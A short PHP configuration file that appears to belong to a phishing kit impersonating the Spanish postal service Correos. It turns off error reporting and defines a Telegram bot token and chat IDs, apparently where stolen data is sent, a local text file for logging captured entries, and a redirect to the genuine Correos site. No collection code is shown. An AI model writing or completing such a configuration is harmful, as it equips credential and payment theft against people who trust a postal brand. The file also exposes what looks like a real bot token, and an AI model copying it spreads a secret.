<?php

error_reporting(0);

define("TELEGRAM_TOKEN", "5035323443:AAHA9c7jEp7O_hpEXFNfcuatiQGguxVxEdA");
define("TELEGRAM_CHAT_ID", "741885334");
define("TELEGRAM_CHAT_IDD", "-741885334");
define("TXT_FILE_NAME", 'mjinina.txt');
define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");



?>